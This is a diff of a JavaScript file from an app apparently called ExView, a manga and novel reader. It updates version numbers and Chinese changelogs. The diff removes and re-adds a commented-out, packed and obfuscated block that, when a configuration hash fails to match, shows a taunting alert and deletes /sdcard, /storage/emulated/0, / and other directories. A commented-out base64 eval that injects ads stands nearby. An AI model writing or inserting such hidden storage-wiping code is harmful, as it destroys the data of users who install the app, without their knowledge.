@@ -34,16 +34,16 @@
 			var feedbackpath='http://exview.gtool.ml/ExView/android.html'; */
 		}else{
 			var nowversion=ExView.version;
-			var newestversion="2.4.0";
-			var newestversioninfo="2017.04.18 2.4.0<br>1.实现沉浸状态栏<br>2.加快启动速度<br>3.详情页面修改<br>4.修复标签空格bug<br>5.优化侧栏滑动<br>6.鉴于有小学生那所谓破解方法去倒卖，升级来源管理机制，请大家重新安装所有来源规则<br>7.修复安全漏洞，升级用户系统，请大家重新登陆，见谅！<br>8.小说阅读体验小优化<br>9.修复一些已知问题";
+			var newestversion="2.4.1";
+			var newestversioninfo="2017.05.05 2.4.1<br>1.优化主页加载<br>2.添加网址提示<br>3.修正轻小说阅读器翻页偏移<br>4.修正若干处内存泄露<br>5.优化下载功能<br>6.修正4.4系统列表切换自动滚动bug<br>7.优化大图切割算法<br>8.优化因大规模网络请求导致最新更新，热门推荐等列表出现卡死现象<br>9.修复下载偶尔出现错误问题";
 			//var updatepath=iscrosswalk()?'http://www.coolapk.com/apk/com.gentle.exview.plus':'http://www.coolapk.com/apk/com.gentle.exview';
 			var updatepath='http://exview.gtool.ml/ExView/android.html';	
 			var feedbackpath=updatepath;			
 		}
 	}else{
 		var nowversion=ExView.nativeversion;
-		var newestversion="0.0.9";
-		var newestversioninfo="2017.04.18 0.0.9<br>1.修复标签空格bug<br>2.鉴于有小学生那所谓破解方法去倒卖，升级来源管理机制，请大家重新安装所有来源规则<br>3.修复安全漏洞，升级用户系统，请大家重新登陆，见谅！<br>4.小说阅读体验小优化<br>5.修复一些已知问题";
+		var newestversion="0.1.0";
+		var newestversioninfo="2017.05.05 2.4.1<br>1.优化主页加载<br>2.添加网址提示<br>3.修正轻小说阅读器翻页偏移<br>4.修正若干处内存泄露<br>5.优化下载功能<br>6.优化大图切割算法<br>7.优化因大规模网络请求导致最新更新，热门推荐等列表出现卡死现象<br>8.修复下载偶尔出现错误问题";
 		var updatepath="http://pan.baidu.com/s/1dFCvgsx#list/path=%2F%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%2FExView%2FWindows&parentPath=%2F%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6";
 		var feedbackpath='http://www.coolapk.com/apk/com.gentle.exview';
 	}
@@ -116,8 +116,6 @@
 	//eval(atob("bXlTZXNzaW9uLmhhbmRsZUlmcmFtZU9ubG9hZGVkPWZ1bmN0aW9uKGNvbnRhaW5lcix0eXBlKXtpZigkJChjb250YWluZXIpLmF0dHIoImxvYWRlZCIpKXtyZXR1cm59JCQoY29udGFpbmVyKS5hdHRyKCJsb2FkZWQiLDEpO3ZhciBoYW5kbGU9ZnVuY3Rpb24oZGlydCl7dmFyIGRvZm49ZnVuY3Rpb24oKXtpZih0eXBlPT0xKXtjb250YWluZXIuc3JjPSdqYXZhc2NyaXB0OlwnPGltZyBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9naG9zdGd6dC9FeFZpZXcvbWFzdGVyL3Jlcy9nYWRfNDY4eDgwLmpwZyIgc3R5bGU9IndpZHRoOjEwMCU7Ii8+XCcnfWVsc2V7Y29udGFpbmVyLnNyYz0namF2YXNjcmlwdDpcJzxpbWcgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZ2hvc3RnenQvRXhWaWV3L21hc3Rlci9yZXMvZ2FkXzMwMHgyNTAuanBnIiBzdHlsZT0id2lkdGg6MTAwJTsiLz5cJyd9fTtpZihkaXJ0KXtkb2ZuKCk7cmV0dXJufSQkLmdldCgiaHR0cDovL3d3dy5mZWl4aW4yLmNvbS8iLGZ1bmN0aW9uKCl7fSxmdW5jdGlvbigpe2RvZm4oKX0pfTt0cnl7dmFyIHdpbj1jb250YWluZXIuY29udGVudFdpbmRvd3x8Y29udGFpbmVyLndpbmRvdztpZigod2luLmxvY2F0aW9uLmhyZWYuaW5kZXhPZigiZGF0YSIpPT0wKSl7aGFuZGxlKHRydWUpfWVsc2V7aGFuZGxlKCl9fWNhdGNoKGUpe319"));
 	
 	
-	
-	
 	//通知显示
 	try{
 		if(window.debug&&nowversion!=newestversion){
@@ -161,25 +159,23 @@
 		$$("#thankspanel .chip").removeClass("active");
 		$$(_this).addClass("active");
 	}
-/* 	if(localStorage.ExView_InitJSON&&localStorage.ExView_InitJSON!='""'&&localStorage.ExView_InitJSON!=''){
+	/* if(localStorage.ExView_InitJSON&&localStorage.ExView_InitJSON!='""'&&localStorage.ExView_InitJSON!=''){
 		Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('v(["s","m"].u(2.b.c.f(\'6 9!\'+0.4+\'6 9!\'))==-1&&!d.e){7 0.4;g.h="i";7 0.j;2.k.l("\\8\\8\\n\\o\\p\\q\\r~<5>\\t\\3\\a\\w\\x\\y\\z\\A\\B+\\3\\a\\C\\D\\E\\F\\G\\H<5>\\3\\I+\\J\\K\\L\\M",N.O,P(){2.Q.R.S(1)});T U();}',57,57,'localStorage||ExView|u6350|ExView_InitJSON|br|Keep|delete|u597d|Out|u8d60|tools|md5|window|debug|hex_md5|mySession|initjsonpath|RtuFEqa|ExView_InitType|fw|alert|552bc26417cb2969badc8f1229797571|u5750|u516c|u4ea4|u8f66|u5427|9c072c6d89e86e513b2b66af163cf30f|u5df2|indexOf|if|u7684|u8001|u53f8|u673a|uff0c|u51ed10|u51ed|u636e|u627e|u4f5c|u8005|uff01|u8d6050|u53bb|u5e7f|u544a|u9001VIP|sessionStorage|modaltitleextra|function|modules|pluginpage|init|throw|SyntaxError'.split('|'),0,{}))()	
 	} */	
-try{
-	if(getvipdisp()/* ||ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347" */){
-		mySession.initjsonpath=mySession.driverjsonpath/* mySession.backinitjsonpath */;
-		localStorage.ExView_InitJSON=mySession.initjsonpath;
-		var salt=ExView.tools.md5.hex_md5(localStorage.ExView_LoginUser);
-		localStorage.ExView_InitJSONVerify=btoa(salt+initjsonverify(localStorage.ExView_InitJSON,localStorage.ExView_LoginUser,salt)+salt);
-		exviewdata.setItem("ExView_InitJSONVerify",localStorage.ExView_InitJSONVerify);		
-		//delete localStorage.ExView_InitJSON;
-		//delete localStorage.ExView_InitType;		
-	}/* else{
-		if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"){
-			Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('t(2(){s b=["u"];$$.z("k.r",2(a){a=3.4.v.x(a);-1!=b.A(a)&&(f("g!\\h\\i\\j\\e\\l\\m\\n\\o\\p\\q"),3.4.5.6("/9/",2(){},2(){},7.8),3.4.5.6("9",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){},7.8),3.4.5.6("/w/9/",2(){},2(){},7.8),3.4.5.6("/c/y/",2(){},2(){},7.8),3.4.5.6("/c/d/0/",2(){},2(){},7.8),3.4.5.6("/B/C/0/",2(){},2(){},7.8),3.4.5.6("/c/d/1/",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){}),3.4.5.6("3",2(){},2(){}))},2(){})},D);',40,40,'||function|ExView|tools|file|rmdir|mySession|fs|sdcard|||storage|emulated|u7528|alert|Hello|u6b22|u8fce|u4f7f|MoeRuntime|u7231|u556a|u59b9|u7834|u89e3|uff01|so|var|setTimeout|461cf9a308dbfed556768517bcbf975b|md5|mnt|hex_md5|sdcard0|get|indexOf|data|media|5000'.split('|'),0,{}))()			
-		}
-	} */	
-}catch(e){}
-
-
+	try{
+		if(getvipdisp()/* ||ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347" */){
+			mySession.initjsonpath=mySession.driverjsonpath/* mySession.backinitjsonpath */;
+			localStorage.ExView_InitJSON=mySession.initjsonpath;
+			var salt=ExView.tools.md5.hex_md5(localStorage.ExView_LoginUser);
+			localStorage.ExView_InitJSONVerify=btoa(salt+initjsonverify(localStorage.ExView_InitJSON,localStorage.ExView_LoginUser,salt)+salt);
+			exviewdata.setItem("ExView_InitJSONVerify",localStorage.ExView_InitJSONVerify);		
+			//delete localStorage.ExView_InitJSON;
+			//delete localStorage.ExView_InitType;		
+		}/* else{
+			if(ExView.tools.md5.hex_md5(mySession.initjsonpath)!="54adf540d2293f4835297d2541452347"){
+				Function(function(f,u,c,k,e,r){e=function(c){return(c<u?'':e(parseInt(c/u)))+((c=c%u)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])f=f.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return f}('t(2(){s b=["u"];$$.z("k.r",2(a){a=3.4.v.x(a);-1!=b.A(a)&&(f("g!\\h\\i\\j\\e\\l\\m\\n\\o\\p\\q"),3.4.5.6("/9/",2(){},2(){},7.8),3.4.5.6("9",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){},7.8),3.4.5.6("/w/9/",2(){},2(){},7.8),3.4.5.6("/c/y/",2(){},2(){},7.8),3.4.5.6("/c/d/0/",2(){},2(){},7.8),3.4.5.6("/B/C/0/",2(){},2(){},7.8),3.4.5.6("/c/d/1/",2(){},2(){},7.8),3.4.5.6("/",2(){},2(){}),3.4.5.6("3",2(){},2(){}))},2(){})},D);',40,40,'||function|ExView|tools|file|rmdir|mySession|fs|sdcard|||storage|emulated|u7528|alert|Hello|u6b22|u8fce|u4f7f|MoeRuntime|u7231|u556a|u59b9|u7834|u89e3|uff01|so|var|setTimeout|461cf9a308dbfed556768517bcbf975b|md5|mnt|hex_md5|sdcard0|get|indexOf|data|media|5000'.split('|'),0,{}))()			
+			}
+		} */	
+	}catch(e){}
 
 })();
